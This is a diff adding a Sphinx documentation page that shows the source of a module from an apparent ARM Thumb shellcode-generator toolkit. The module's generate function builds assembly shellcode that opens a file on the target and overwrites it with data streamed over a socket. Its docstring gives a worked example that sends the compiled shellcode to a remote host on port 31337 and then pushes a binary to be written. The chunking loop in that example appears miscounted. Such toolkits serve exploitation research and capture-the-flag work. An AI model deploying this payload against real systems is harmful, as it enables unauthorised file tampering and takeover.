@@ -1,0 +1,153 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>shellcodes.thumb.overwrite &mdash; ..  documentation</title>
+    
+    <link rel="stylesheet" href="../../../_static/default.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../../../',
+        VERSION:     '',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true
+      };
+    </script>
+    <script type="text/javascript" src="../../../_static/jquery.js"></script>
+    <script type="text/javascript" src="../../../_static/underscore.js"></script>
+    <script type="text/javascript" src="../../../_static/doctools.js"></script>
+    <link rel="top" title="..  documentation" href="../../../index.html" />
+    <link rel="up" title="Module code" href="../../index.html" /> 
+  </head>
+  <body>
+    <div class="related">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../../../genindex.html" title="General Index"
+             accesskey="I">index</a></li>
+        <li class="right" >
+          <a href="../../../py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li><a href="../../../index.html">..  documentation</a> &raquo;</li>
+          <li><a href="../../index.html" accesskey="U">Module code</a> &raquo;</li> 
+      </ul>
+    </div>  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body">
+            
+  <h1>Source code for shellcodes.thumb.overwrite</h1><div class="highlight"><pre>
+<span class="c"># overwrites a file with user&#39;s data</span>
+
+<span class="kn">import</span> <span class="nn">open_file</span>
+<span class="kn">import</span> <span class="nn">read_from_stack</span>
+<span class="kn">import</span> <span class="nn">write_to_stack</span>
+
+<span class="n">O_RDONLY</span> <span class="o">=</span> <span class="mo">00000000</span>
+<span class="n">O_WRONLY</span> <span class="o">=</span> <span class="mo">00000001</span>
+<span class="n">O_RDWR</span>   <span class="o">=</span> <span class="mo">00000002</span>
+<span class="n">O_CREAT</span>  <span class="o">=</span> <span class="mo">00000100</span>
+<span class="n">MAXSIZE</span>  <span class="o">=</span> <span class="mi">128</span>
+
+<div class="viewcode-block" id="generate"><a class="viewcode-back" href="../../../shellcodes.thumb.html#shellcodes.thumb.overwrite.generate">[docs]</a><span class="k">def</span> <span class="nf">generate</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="n">sock</span><span class="p">,</span> <span class="n">isNewFile</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;overwrites a file with user&#39;s data</span>
+
+<span class="sd">    argument:</span>
+<span class="sd">        filepath (str)    : file name to open</span>
+<span class="sd">        sock (int/str/reg): read a sock to write data</span>
+
+<span class="sd">    example for sending a big file to remote to write</span>
+
+<span class="sd">    HOST = &#39;hostname&#39;</span>
+<span class="sd">    PORT = 31337</span>
+<span class="sd">    MAXSIZE = 128</span>
+
+<span class="sd">    sc  = scgen.overwrite(&#39;./binary&#39;, 4)</span>
+<span class="sd">    sc += scgen.exit(0)</span>
+<span class="sd">    xsc = CompileSC( (sc), isThumb=True)</span>
+
+<span class="sd">    s = socket(AF_INET, SOCK_STREAM)</span>
+<span class="sd">    s.connect( (HOST, PORT) )</span>
+<span class="sd">    f = s.makefile(&#39;rw&#39;, bufsize=0)</span>
+<span class="sd">    f.write(xsc + &#39;\n&#39;)</span>
+<span class="sd">    data = open(&#39;/path/to/binary&#39;, &#39;rb&#39;).read()</span>
+
+<span class="sd">    size = len(data)</span>
+<span class="sd">    mod  = size % MAXSIZE</span>
+<span class="sd">    for i in range(0, mod):</span>
+<span class="sd">        f.write(data[i*128:(i+1)*MAXSIZE])</span>
+<span class="sd">    f.write(data[mod*MAXSIZE:])</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="k">if</span> <span class="n">isNewFile</span><span class="p">:</span>
+        <span class="n">sc</span> <span class="o">=</span> <span class="n">open_file</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="o">|</span><span class="n">O_CREAT</span><span class="p">,</span> <span class="mo">0755</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">sc</span> <span class="o">=</span> <span class="n">open_file</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">)</span>
+    <span class="n">sc</span> <span class="o">+=</span> <span class="s">&quot;&quot;&quot;</span>
+<span class="s">loop_1:</span>
+<span class="s">    &quot;&quot;&quot;</span>
+    <span class="n">sc</span> <span class="o">+=</span> <span class="n">write_to_stack</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">MAXSIZE</span><span class="p">)</span>
+    <span class="n">sc</span> <span class="o">+=</span> <span class="s">&quot;&quot;&quot;</span>
+<span class="s">    mov r5, r0</span>
+<span class="s">    &quot;&quot;&quot;</span>
+    <span class="n">sc</span> <span class="o">+=</span> <span class="n">read_from_stack</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="s">&#39;r6&#39;</span><span class="p">,</span> <span class="s">&#39;r0&#39;</span><span class="p">)</span>
+
+    <span class="n">sc</span> <span class="o">+=</span> <span class="s">&quot;&quot;&quot;</span>
+<span class="s">    cmp r5, #</span><span class="si">%s</span><span class="s"></span>
+<span class="s">    beq loop_1</span>
+<span class="s">    &quot;&quot;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">MAXSIZE</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">sc</span></div>
+</pre></div>
+
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar">
+        <div class="sphinxsidebarwrapper">
+<div id="searchbox" style="display: none">
+  <h3>Quick search</h3>
+    <form class="search" action="../../../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    <p class="searchtip" style="font-size: 90%">
+    Enter search terms or a module, class or function name.
+    </p>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="related">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../../../genindex.html" title="General Index"
+             >index</a></li>
+        <li class="right" >
+          <a href="../../../py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li><a href="../../../index.html">..  documentation</a> &raquo;</li>
+          <li><a href="../../index.html" >Module code</a> &raquo;</li> 
+      </ul>
+    </div>
+    <div class="footer">
+        &copy; Copyright 2014, Author.
+      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.2b1.
+    </div>
+  </body>
+</html>
